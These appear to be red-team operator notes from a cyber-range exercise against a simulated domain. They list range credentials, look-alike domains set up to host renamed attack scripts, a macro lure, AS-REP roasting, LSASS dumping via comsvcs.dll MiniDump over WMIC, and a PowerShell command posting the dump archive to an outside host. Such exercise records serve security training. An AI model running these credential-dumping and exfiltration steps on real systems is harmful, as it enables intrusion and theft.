
## Key Data
---

**Domain Targeted:** MDA

>[!info]- Credentials Utilized
>
>| Username | Password | Host(s) |
>| - | - | - |
>| bryon.ball  | ` qBy6@3gL+wFn ` | MDA-S1-1 (41.0.4.3), MDA-S6-1 (41.0.8.3) |
>| webmin | `P@ssw0rd!` | MDA-S6-1 (41.0.8.3) |
>| Administrator (local) | `Simspace1!Simspace1!` | MDA-S6-1 (41.0.8.3) |
>| houston.clements | `AM$M+u2h@o4W `| MDA-S6-1 (41.0.8.3), MDA-SHRPT (41.0.2.4) |

> [!info]- MDA Administrators
> 
> | Username | Password |
> | - | - |
> | Local Administrator (DC) | Simspace3#Simspace3# | 
> | connor.mcgregor | temp |
> | cpt_account | temp |
> | dakota | temp |
> | sqlfarm | temp |
> | jeri.wu (S6) | `B+N5K#6YzJ#f ` |
> | houston.clements (S6)  | `AM$M+u2h@o4W ` |
> | cruz.harrison (VPN)  | ` j+U8H@W@L5$a ` |

> [!info]- Domains Utilized
> 
> | IP Address | Domain |
> | - | - |
> | 63.72.155.49 | `www.google.com.co` |
> | 152.42.85.67 | `video.memezilla.com.cn` |

## Vulnerability Setup
---

### Step 1: Attacker Networking

- Using Kali-1 for actions/VPN.
- Using Kali-2 for anything web-hosted due to VPN messing with domain GET requests.

Original Networking
```shell
# Kali 1
ip -br a
# eth0  UP  10.10.230.10/16
# eth1  UP  30.0.0.10/24

# Kali 2
ip -br a
# eth0  UP  10.10.230.11/16
# eth1  UP  30.0.0.11/24
```

Adjusted Networking (`/etc/network/interfaces`)
```
### Kali 1

source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth1
iface eth1 inet static
address 30.0.0.10/24
gateway 30.0.0.1
```

```
### Kali 2

source /etc/network/interfaces.d/*

auto lo
iface lo inet loopback

auto eth1
iface eth1 inet static
address 30.0.0.11/24
gateway 30.0.0.1

# MDA Plan (www.google.com.co)
iface eth1 inet static
address 63.72.155.49

# MDA Plan (video.memezilla.com.cn)
iface eth1 inet static
address 152.42.85.67
```

- If that doesn't work:
```shell
# Kali 2
sudo ip a add 63.72.155.49/32 dev eth1
sudo ip a add 152.42.85.67/32 dev eth1
sudo ip route add default via 30.0.0.1
```

- Killed NetworkManager
```shell
# Kill NetworkManager
sudo systemctl stop NetworkManager
sudo systemctl disable NetworkManager

# Restart Networking Service
sudo systemctl restart networking.service

# Validate IP Address(es) & Validate Connection
ip -br a
ping 30.0.0.1
```

- Added domains, but DNS records are not setup.
```
Domain: google.com.co
- A Record: @ --> 63.72.155.49
- CNAME Record: www --> google.com.co

Domain: memezilla.com.cn
- A Record: @ --> 152.42.85.67
- CNAME Record: video --> memezilla.com.cn
```

- Validated with:
```
nslookup www.google.com.co
ping www.google.com.co
nslookup video.memezilla.com.cn
ping video.memezilla.com.cn
```


### 2. VPN Configuration

- No issues.

### 3. Dependencies & Downloads

- Upload `scripts.zip` and `pypykatz-deps.zip` to PCTE
```shell
# Download
wget http://10.10.254.1:46692/<filename> -O <filename>.zip
unzip <filename>
```


### 4. All Vulns + Logins

- Completed at 12:44am, 16JAN2023


## Plan
---

### Initial Access (Tues, 16JAN2023)


- RDP as `bryon.ball` at 00:56:47
- Macro infested Excel 97-2003 Workbook saved as `collaborationSpreadSheetDoc313387396474512349.xls` at 01:38
- Executed `where /r C:\ *powershell.exe` at 01:40
	- Should have created `collaborationData.xls` in the Documents folder.

### Discovery & Lateral Movement (Tues, 16JAN2023)


> [!danger] McCann Notes
> - Using `www.google.com.co`
> 	- Renamed `adpeas.ps1` to `maps`
> 	- Renamed `asreproast.ps1` to `analytics`
> - Using `video.memezilla.com.cn`
> 	- Renamed `fodhelper.ps1` to `watchv=1qaz2wsx3edc`
> 	- Renamed `runas.ps1` to `watchv=1z2x3c4v5b6n`

- Executed `adpeas.ps1` at 2:01
	- Grabbed from `http://www.google.com.co/maps`
	- Hash returned, but failed to crack from john after 30 minutes.
- Executed `asreproast.ps1` at 02:43
	- Grabbed from `http://www.google.com.co/analytics`
	- Webmin hash cracked in 1 second.
- Executed `([adsisearcher]'objectcatergory=computer').findall()` at 02:47
	- Output saved to `mda-computers.txt`
- Executed `nslookup mda-s6-1` at 02:49
	- IP Address: 41.0.8.3
- Executed `runas.ps1` at 02:56
	- Grabbed from `http://video.memezilla.com.cn/watchv=1z2x3c4v5b6n`
- Validated success with `net group S6_Users /domain` at 02:57
- RDP'd into `MDA-S6-1` at 2:59/3:00

### Domain Privilege Escalation (17JAN2024)

- Dumped LSASS on S6-1 at 15:00
	- Dump File: `C:\Users\bryon.ball\AppData\Local\Temp\lsass.DMP`
- Created `wmdat.zip` and deleted the dump file.
- Attempted SelfSignedCert bypass; unsuccessful at 15:04.
- Got it working.
- S6-1 failed to resolve: `www.google.com.co`
- Successfully exfilled to `https://video.memezilla.com.cn` at 15:17
- RDP'd into `MDA-S6-1` as a local Administrator at  15:24
- Ran `nslookup mda-shrpt` at 15:26
	- IP Address: 41.0.2.4
- Ran `net user Administrator` at 15:30
- Via WMIC, executed `'powershell.exe rundll32 C:\windows\system32\comsvcs.dll MiniDump $((get-process -name lsass).id) C:\Users\Public\downloads\sysinternals.zip full'` on MDA-SHRPT at 15:36
- Via WMIC, executed `'powershell.exe compress-archive C:\Users\Public\Downloads\sysinternals.zip C:\users\public\downloads\sysmon.zip'` at 15:38
- Via WMIC, executed `powershell.exe iwr http://youztubi.com.pa -usebasicparsing -method post  -infile C:\Users\Public\Downloads\sysmon.zip'`
	- Unsuccessful due to `pma_server.py`
- Executed again, successful at 15:42.

- Extracted Domain Admin (`houston.clements`) from dump file.
- Exited RDP session at 15:45

### Impact / Exfiltration

- Uhhh

